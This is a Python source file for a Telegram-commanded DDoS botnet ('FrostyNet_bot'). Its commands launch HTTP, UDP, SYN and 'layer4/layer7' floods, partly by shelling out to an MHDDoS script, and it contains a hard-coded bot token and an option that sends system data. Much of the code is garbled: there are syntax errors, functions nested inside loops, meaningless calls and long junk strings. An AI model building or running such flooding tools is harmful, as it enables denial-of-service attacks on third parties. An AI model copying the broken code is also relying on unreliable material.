import time
import threading
from pybotnet import proxy,telegram_engine,botnet
from telegram.ext import Updater, CommandHandler, MessageHandler,filters
import subprocess
import telegram
import requests,json
import socket
import ipaddress
import nmap
TOKEN = '6709820541:AAHxFU-2PBvrkaGR1kmF_Ch8_QEgnXkxaXs'
BOTNAME = '@FrostyNet_bot'
s = '360'
url='https://api.telegram.org/bot'+TOKEN+"/SetMyCommands?commands="
cmd=[{
     "command":"sublime",
     "description":"dsecription for bbosing"
},
{
  "command":"http_stresser2",
  "description":"description for http method"   
},
{
     "command":"socket1",
     "description":"description for socket method"
},
{
     "command":"layer4",
     "description":"layer4 method"
},
{
  "command":"layer7",
  "description":"layer7 method"     
}
cmd=json.dumps(cmd)
url=url+str(cmd)
response=requests.get(url)
print(response)
payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
def sublime(update: Updater,CallbackContext ,context):
    url = Updater.message.text.replace('/sublime', '')
    telegram = telegram_engine(TOKEN,show_log=True,send_system_data=True)
    delay = 10
    bruh = subprocess.call(f'python3 ~/MDHDOS/telegram.py GET {url} 1 400 mhddos_proxy/list 1000 {s}', stdout=subprocess.PIPE, shell=True)
    method = """\033[91m
+------------------------------------------------------+
¦                     \033[00mDDoS METHODS\033[91m                     ¦               
¦------------------------------------------------------¦
¦ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m UDP ATTACK\033[91m    ¦
¦ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m ICMP ATTACK\033[91m   ¦
¦ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m SYN ATTACK\033[91m    ¦
¦ \033[00mHTTP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m|\033[00m HTTP ATTACK\033[91m   ¦
+------------------------------------------------------+\033[00m
"""
    while True:
      print('*--*'*15)
      if url == True:
            for i in payload(target=method):
                  print(bruh)
                  time = threading.Thread(target=sublime, args=(5000), kwargs={}, daemon=True)
                  time.start()
                  Updater.dispatcher.add_handler(CommandHandler('sublime', sublime))
                  Updater.start_polling()
                  Updater.idle()
                  if __name__ == '__main__':
                       sublime()
                       bruh()
                       method()


                       def http_stresser2(CallbackContext,context):
                            url2 = Updater.message.text.replace('/http_stresser2', '')
                            Updater.dispatcher.add_handler(CommandHandler('http_stresser2', http_stresser2))
                            Updater.start_polling()
                            Updater.idle()
                            telegram = telegram_engine(TOKEN,show_log=True,send_system_data=True)
                            delay = 10
                            http_baseurl = 'http://'
                            if http_baseurl == True:
                                 for i in requests('r',10000000000000000000000*1000000000000000000000,payload):
                                      requests.get(http_baseurl)
                                      print(requests)
                                      if __name__ == '__main__':
                                           http_stresser2()
                                           

                                           def socket1():
                                               while True:
                                                  url2 = Updater.message.text.replace('/http_stresser2', '')
                                                  Updater.dispatcher.add_handler(CommandHandler('http_stresser2', http_stresser2))
                                                  Updater.start_polling()
                                                  Updater.idle()
                                                  PACKETDATA = 'f1a525da11f6'.decode('hex')
                                                  UDP_IP = "127.0.0.1"
                                                  UDP_PORT = 1234
                                                  sock = socket(socket.AF_INET,socket.SOCK_RAW,socket.SOCK_DGRAM)
                                                  for i in socket():
                                                         if socket == PACKETDATA:
                                                            print("UDP target ip:  ",UDP_IP)
                                                            print("UDP target port: ",UDP_PORT)
                                                            if UDP_PORT == UDP_IP == True:
                                                                 sock.sendto(PACKETDATA)
                                                                 print(PACKETDATA)


def layer4(CallbackContext,Updater,thread):
     url223 = Updater.message.text.replace('/layer4', '')
     Updater.dispatcher.add_handler(CommandHandler('layer4', layer4))
     Updater.idle()
     Updater.start_polling()
     PACKETDATA = 'f1a525da11f6'.decode('hex')
     _SENDATTACK = any
     _SENDFLOODING = any
     proxy = list = True
     for i in range(layer4,payload,PACKETDATA).socket:
          socket.sendto(payload,layer4,PACKETDATA,'a$psize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa')
          print(payload)
          print(layer4)


def layer7(CallbackContext,Updater):
     url223 = Updater.message.text.replace('/layer7', '')
     Updater.dispatcher.add_handler(CommandHandler('layer7', layer7))
     Updater.idle()
     Updater.start_polling()
     PACKETDATA = 'f1a525da11f6'.decode('hex')
     _FLOODING = any
     _ATTACKING = any
     for i in range(layer7,payload,PACKETDATA).socket:
          socket.sendto(payload,layer7,PACKETDATA,'saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa')
          print(payload)
          print(layer7)
